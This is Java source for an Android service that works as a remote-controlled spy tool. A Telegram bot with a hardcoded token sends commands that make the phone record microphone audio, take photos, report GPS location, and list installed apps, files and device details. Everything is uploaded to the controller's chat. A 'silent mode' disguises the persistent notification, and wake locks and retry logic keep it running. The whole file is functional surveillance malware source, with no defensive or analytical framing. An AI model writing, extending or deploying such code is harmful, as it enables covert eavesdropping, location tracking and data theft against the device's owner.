package com.example.listener;

import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.*;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class ListenerService extends Service {
    private static final String TAG = "Listener";
    private static final String TOKEN = "9237412404:AAFOGqcDN-w1LZV36GnztszDBSfIAvBIBuw";
    private static final String BASE  = "https://api.telegram.org/bot" + TOKEN + "/";
    private static final String PREFS = "listener_prefs";
    private static final String KEY_UPD = "last_update_id";
    private static final String KEY_SILENT = "silent_mode";
    private static final int    KEEP  = 20;

    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(70, TimeUnit.SECONDS)
            .writeTimeout(120, TimeUnit.SECONDS)
            .build();

    private volatile boolean running = false;
    private MediaRecorder recorder;
    private File currentFile;
    private String currentChat;
    private File audioDir;
    private File photoDir;
    private PowerManager.WakeLock wakeLock;
    private final LinkedList<String> logBuffer = new LinkedList<>();
    private static final int LOG_MAX = 80;
    private BroadcastReceiver photoReceiver;

    @Override public void onCreate() {
        super.onCreate();
        audioDir = new File(getExternalFilesDir(null), "audio");
        audioDir.mkdirs();
        photoDir = new File(getExternalFilesDir(null), "photos");
        photoDir.mkdirs();
        createChannel();
        boolean silent = getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(KEY_SILENT, false);
        startForeground(1, notif(silent ? "Service running" : "Listener running"));
        acquireWake();
        running = true;
        new Thread(this::pollLoop, "tg-poll").start();
        new Thread(this::retryPending, "retry").start();
        registerPhotoReceiver();
        log("Service started");
    }

    private void registerPhotoReceiver() {
        photoReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                String chatId = i.getStringExtra(CaptureActivity.EXTRA_CHAT);
                String path = i.getStringExtra(CaptureActivity.EXTRA_PATH);
                if (chatId == null) return;
                if (path == null) {
                    sendText(chatId, "Photo capture failed or cancelled");
                    return;
                }
                File f = new File(path);
                if (!f.exists()) {
                    sendText(chatId, "Photo file not found");
                    return;
                }
                sendText(chatId, "Uploading photo...");
                new Thread(() -> {
                    boolean ok = sendFile(chatId, f, "sendPhoto", "photo");
                    sendText(chatId, ok ? "Photo sent" : "Photo upload failed");
                }).start();
            }
        };
        IntentFilter filter = new IntentFilter(CaptureActivity.ACTION_PHOTO_RESULT);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(photoReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(photoReceiver, filter);
        }
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        running = false;
        safeStop();
        releaseWake();
        try { if (photoReceiver != null) unregisterReceiver(photoReceiver); } catch (Exception ignored) {}
        super.onDestroy();
    }

    private void log(String msg) {
        String line = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date()) + " " + msg;
        synchronized (logBuffer) {
            logBuffer.add(line);
            while (logBuffer.size() > LOG_MAX) logBuffer.removeFirst();
        }
        Log.i(TAG, msg);
    }

    private void acquireWake() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Listener::wl");
                wakeLock.acquire();
            }
        } catch (Exception e) { Log.e(TAG, "wake", e); }
    }
    private void releaseWake() {
        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); } catch (Exception ignored) {}
    }

    private void pollLoop() {
        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
        long lastId = sp.getLong(KEY_UPD, 0);
        while (running) {
            try {
                String url = BASE + "getUpdates?timeout=30&offset=" + (lastId + 1);
                Request req = new Request.Builder().url(url).build();
                try (Response resp = http.newCall(req).execute()) {
                    if (resp.isSuccessful() && resp.body() != null) {
                        JSONObject j = new JSONObject(resp.body().string());
                        JSONArray arr = j.optJSONArray("result");
                        if (arr != null) for (int i = 0; i < arr.length(); i++) {
                            JSONObject u = arr.getJSONObject(i);
                            lastId = u.optLong("update_id", lastId);
                            sp.edit().putLong(KEY_UPD, lastId).apply();
                            safeHandle(u);
                        }
                    }
                }
            } catch (Exception e) { Log.e(TAG, "poll", e); }
            try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
        }
    }

    private void safeHandle(JSONObject upd) {
        try {
            JSONObject m = upd.optJSONObject("message");
            if (m == null) return;
            String text = m.optString("text", "").trim();
            String lower = text.toLowerCase(Locale.US);
            String chatId = m.getJSONObject("chat").getString("id");

            if (lower.equals("/record") || lower.equals("record")) {
                if (recorder == null) { startRec(chatId); sendText(chatId, "Recording started"); }
                else sendText(chatId, "Already recording");
            } else if (lower.equals("/stop") || lower.equals("stop")) {
                if (recorder != null) { stopRec(chatId); }
                else sendText(chatId, "Not recording");
            } else if (lower.equals("/status") || lower.equals("status")) {
                sendText(chatId, recorder != null ? "Recording in progress" : "Idle");
            } else if (lower.equals("/photo") || lower.equals("photo")) {
                takePhoto(chatId);
            } else if (lower.equals("/location") || lower.equals("location") || lower.equals("/loc")) {
                sendLocation(chatId);
            } else if (lower.equals("/info") || lower.equals("info") || lower.equals("/battery")) {
                sendInfo(chatId);
            } else if (lower.equals("/cleanup") || lower.equals("cleanup")) {
                doCleanup(chatId);
            } else if (lower.equals("/logs") || lower.equals("logs")) {
                sendLogs(chatId);
            } else if (lower.startsWith("/silent")) {
                handleSilent(chatId, lower);
            } else if (lower.equals("/apps") || lower.equals("apps")) {
                sendApps(chatId);
            } else if (lower.equals("/files") || lower.equals("files")) {
                sendFiles(chatId);
            } else if (lower.equals("/help") || lower.equals("help") || lower.equals("/start")) {
                sendHelp(chatId);
            }
        } catch (Exception e) {
            Log.e(TAG, "handle", e);
            log("handle error: " + e.getMessage());
        }
    }

    private void sendHelp(String chatId) {
        String h = "Commands:\n"
                + "/record - start audio\n"
                + "/stop - stop and upload\n"
                + "/status - recording status\n"
                + "/photo - take photo\n"
                + "/location - current location\n"
                + "/info - battery and device info\n"
                + "/apps - installed apps list\n"
                + "/files - app files list\n"
                + "/cleanup - delete old audio\n"
                + "/logs - recent app logs\n"
                + "/silent on|off - notification mode\n"
                + "/help - this message";
        sendText(chatId, h);
    }

    private void takePhoto(String chatId) {
        try {
            Intent i = new Intent(this, CaptureActivity.class);
            i.putExtra(CaptureActivity.EXTRA_CHAT, chatId);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            sendText(chatId, "Opening camera...");
            log("Photo requested by " + chatId);
        } catch (Exception e) {
            sendText(chatId, "Cannot open camera: " + e.getMessage());
        }
    }

    private void sendLocation(String chatId) {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                if (lm == null) {
                    sendText(chatId, "Location service unavailable");
                    return;
                }
                Location loc = null;
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                        || checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                }
                if (loc == null) {
                    sendText(chatId, "No location available. Open Maps once or grant location permission.");
                    return;
                }
                String maps = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                String msg = String.format(Locale.US,
                        "Location\nLat: %.6f\nLon: %.6f\nAccuracy: %.0fm\n%s",
                        loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), maps);
                sendText(chatId, msg);
                try {
                    RequestBody body = new FormBody.Builder()
                            .add("chat_id", chatId)
                            .add("latitude", String.valueOf(loc.getLatitude()))
                            .add("longitude", String.valueOf(loc.getLongitude()))
                            .build();
                    http.newCall(new Request.Builder().url(BASE + "sendLocation").post(body).build()).execute().close();
                } catch (Exception ignored) {}
                log("Location sent");
            } catch (Exception e) {
                sendText(chatId, "Location error: " + e.getMessage());
            }
        }).start();
    }

    private void sendInfo(String chatId) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                try {
                    IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                    Intent battery = registerReceiver(null, ifilter);
                    if (battery != null) {
                        int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                        int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                        int pct = (int) ((level / (float) scale) * 100);
                        int status = battery.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                        String st = status == BatteryManager.BATTERY_STATUS_CHARGING ? "Charging"
                                : status == BatteryManager.BATTERY_STATUS_FULL ? "Full"
                                : status == BatteryManager.BATTERY_STATUS_DISCHARGING ? "Discharging" : "Unknown";
                        sb.append("Battery: ").append(pct).append("% (").append(st).append(")\n");
                    }
                } catch (Exception ignored) {}
                sb.append("Model: ").append(Build.MODEL).append("\n");
                sb.append("Android: ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
                try {
                    File ext = getExternalFilesDir(null);
                    if (ext != null) {
                        long free = ext.getFreeSpace() / (1024 * 1024);
                        long total = ext.getTotalSpace() / (1024 * 1024);
                        sb.append("Free: ").append(free).append(" MB / ").append(total).append(" MB\n");
                    }
                } catch (Exception ignored) {}
                try {
                    ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                    NetworkInfo ni = cm != null ? cm.getActiveNetworkInfo() : null;
                    if (ni != null && ni.isConnected()) {
                        sb.append("Network: ").append(ni.getTypeName());
                        if (ni.getSubtypeName() != null && !ni.getSubtypeName().isEmpty())
                            sb.append(" (").append(ni.getSubtypeName()).append(")");
                        sb.append("\n");
                    } else {
                        sb.append("Network: Offline\n");
                    }
                } catch (Exception ignored) {}
                boolean silent = getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(KEY_SILENT, false);
                sb.append("Silent: ").append(silent ? "ON" : "OFF").append("\n");
                sb.append("Recording: ").append(recorder != null ? "YES" : "NO");
                sendText(chatId, sb.toString());
                log("Info sent");
            } catch (Exception e) {
                sendText(chatId, "Info error");
            }
        }).start();
    }

    private void sendApps(String chatId) {
        new Thread(() -> {
            try {
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> list = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                List<String> names = new ArrayList<>();
                for (ApplicationInfo ai : list) {
                    if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    String label = pm.getApplicationLabel(ai).toString();
                    names.add(label);
                }
                Collections.sort(names, String.CASE_INSENSITIVE_ORDER);
                StringBuilder sb = new StringBuilder("User apps (").append(names.size()).append("):\n");
                int max = Math.min(names.size(), 40);
                for (int i = 0; i < max; i++) {
                    sb.append("- ").append(names.get(i)).append("\n");
                }
                if (names.size() > max) sb.append("... +").append(names.size() - max).append(" more");
                sendText(chatId, sb.toString());
                log("Apps list sent: " + names.size());
            } catch (Exception e) {
                sendText(chatId, "Apps list error: " + e.getMessage());
            }
        }).start();
    }

    private void sendFiles(String chatId) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder("App files:\n");
                listDir(sb, audioDir, "audio/");
                listDir(sb, photoDir, "photos/");
                File root = getExternalFilesDir(null);
                if (root != null) {
                    File[] others = root.listFiles(f -> f.isFile());
                    if (others != null && others.length > 0) {
                        sb.append("\n(root):\n");
                        for (File f : others) {
                            sb.append("- ").append(f.getName()).append(" (").append(f.length() / 1024).append(" KB)\n");
                        }
                    }
                }
                sendText(chatId, sb.toString());
            } catch (Exception e) {
                sendText(chatId, "Files error");
            }
        }).start();
    }

    private void listDir(StringBuilder sb, File dir, String title) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        sb.append("\n").append(title).append(" (").append(files == null ? 0 : files.length).append(")\n");
        if (files == null) return;
        Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
        int max = Math.min(files.length, 15);
        for (int i = 0; i < max; i++) {
            File f = files[i];
            sb.append("- ").append(f.getName()).append(" (").append(f.length() / 1024).append(" KB)\n");
        }
        if (files.length > max) sb.append("... +").append(files.length - max).append(" more\n");
    }

    private void doCleanup(String chatId) {
        new Thread(() -> {
            try {
                int deleted = 0;
                File[] sent = audioDir.listFiles(p -> p.getName().startsWith("S_"));
                if (sent != null) {
                    for (File f : sent) {
                        if (f.delete()) deleted++;
                    }
                }
                File[] oldPhotos = photoDir.listFiles();
                if (oldPhotos != null) {
                    for (File f : oldPhotos) {
                        if (f.lastModified() < System.currentTimeMillis() - 7L * 24 * 3600 * 1000) {
                            if (f.delete()) deleted++;
                        }
                    }
                }
                sendText(chatId, "Deleted " + deleted + " old file(s)");
                log("Cleanup: " + deleted);
            } catch (Exception e) {
                sendText(chatId, "Cleanup error");
            }
        }).start();
    }

    private void sendLogs(String chatId) {
        StringBuilder sb = new StringBuilder("Recent logs:\n");
        synchronized (logBuffer) {
            if (logBuffer.isEmpty()) {
                sb.append("(empty)");
            } else {
                for (String line : logBuffer) sb.append(line).append("\n");
            }
        }
        sendText(chatId, sb.toString());
    }

    private void handleSilent(String chatId, String lower) {
        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
        if (lower.contains("on")) {
            sp.edit().putBoolean(KEY_SILENT, true).apply();
            startForeground(1, notif("Service running"));
            sendText(chatId, "Silent mode ON");
            log("Silent ON");
        } else if (lower.contains("off")) {
            sp.edit().putBoolean(KEY_SILENT, false).apply();
            startForeground(1, notif("Listener running"));
            sendText(chatId, "Silent mode OFF");
            log("Silent OFF");
        } else {
            boolean s = sp.getBoolean(KEY_SILENT, false);
            sendText(chatId, "Silent is currently " + (s ? "ON" : "OFF") + "\nUse /silent on  or  /silent off");
        }
    }

    private void startRec(String chatId) {
        try {
            currentChat = chatId;
            currentFile = new File(audioDir, "P_" + chatId + "_" + System.currentTimeMillis() + ".m4a");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(64000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(currentFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            log("Recording started");
        } catch (Exception e) {
            Log.e(TAG, "startRec", e);
            safeStop();
            sendText(chatId, "Recording failed to start");
        }
    }

    private void safeStop() {
        try {
            if (recorder != null) {
                try { recorder.stop(); } catch (Exception ignored) {}
                recorder.release();
            }
        } catch (Exception ignored) {}
        recorder = null;
    }

    private void stopRec(String chatId) {
        safeStop();
        final File f = currentFile;
        if (f == null || !f.exists()) return;
        currentFile = null;
        new Thread(() -> {
            sendText(chatId, "Uploading audio (" + (f.length() / 1024) + " KB)...");
            if (uploadAudio(chatId, f)) {
                f.renameTo(new File(audioDir, "S_" + f.getName().substring(2)));
                cleanupOld();
                sendText(chatId, "Audio sent");
                log("Audio uploaded OK");
            } else {
                sendText(chatId, "Upload failed - will retry later");
                log("Audio upload failed");
            }
        }, "upload").start();
    }

    private boolean uploadAudio(String chatId, File f) {
        try { if (sendFile(chatId, f, "sendVoice", "voice")) return true; } catch (Exception ignored) {}
        try { if (sendFile(chatId, f, "sendAudio", "audio")) return true; } catch (Exception ignored) {}
        return false;
    }

    private boolean sendFile(String chatId, File f, String method, String field) {
        try {
            RequestBody fb = RequestBody.create(f, MediaType.parse(field.equals("photo") ? "image/jpeg" : "audio/mp4"));
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(field, f.getName(), fb)
                    .build();
            Request req = new Request.Builder().url(BASE + method).post(body).build();
            try (Response r = http.newCall(req).execute()) { return r.isSuccessful(); }
        } catch (Exception e) {
            Log.e(TAG, "sendFile", e);
            return false;
        }
    }

    private void retryPending() {
        try {
            File[] arr = audioDir.listFiles(p -> p.getName().startsWith("P_"));
            if (arr == null) return;
            for (File f : arr) {
                try {
                    String cid = f.getName().split("_")[1];
                    if (uploadAudio(cid, f)) {
                        f.renameTo(new File(audioDir, "S_" + f.getName().substring(2)));
                        sendText(cid, "Old recording uploaded");
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private void cleanupOld() {
        try {
            File[] sent = audioDir.listFiles(p -> p.getName().startsWith("S_"));
            if (sent == null || sent.length <= KEEP) return;
            Arrays.sort(sent, (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
            for (int i = 0; i < sent.length - KEEP; i++) sent[i].delete();
        } catch (Exception ignored) {}
    }

    private void sendText(String chatId, String text) {
        new Thread(() -> {
            try {
                RequestBody body = new FormBody.Builder()
                        .add("chat_id", chatId).add("text", text).build();
                http.newCall(new Request.Builder().url(BASE + "sendMessage").post(body).build()).execute().close();
            } catch (Exception ignored) {}
        }).start();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("lst", "Listener", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification notif(String t) {
        return new NotificationCompat.Builder(this, "lst")
                .setContentTitle("Telegram Listener")
                .setContentText(t)
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }
}
